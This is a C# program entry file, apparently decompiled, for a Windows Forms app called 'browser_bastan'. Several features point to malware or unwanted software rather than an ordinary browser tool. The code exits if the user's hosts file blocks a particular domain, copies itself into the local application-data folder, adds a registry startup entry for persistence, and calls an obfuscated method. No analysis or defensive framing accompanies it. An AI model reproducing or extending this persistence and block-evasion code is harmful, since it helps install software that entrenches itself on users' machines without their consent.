using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace browser_bastan;

internal static class Program
{
	public static Mutex AppMutex = new Mutex(initiallyOwned: true, "{8F6F0AC4-B9A1-45fd-A8CF-72F04X6FDLRC}");

	[STAThread]
	private static void Main()
	{
		if (!AppMutex.WaitOne(TimeSpan.Zero, exitContext: true))
		{
			Environment.Exit(1);
			return;
		}
		CheckHostsFile();
		string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Araclar.DstName;
		Araclar.DstCheck();
		Araclar.Startup(Araclar.Regkeyname, path);
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Class2.VbnY7VtzSaBmi();
		Form1 form = new Form1();
		Application.Run((Form)(object)form);
		AppMutex.ReleaseMutex();
	}

	public static void CheckHostsFile()
	{
		string text = File.ReadAllText(Environment.GetEnvironmentVariable("windir") + "\\system32\\drivers\\etc\\hosts");
		if (text.Contains("nurullahuzmez.com"))
		{
			Environment.Exit(1);
		}
	}
}
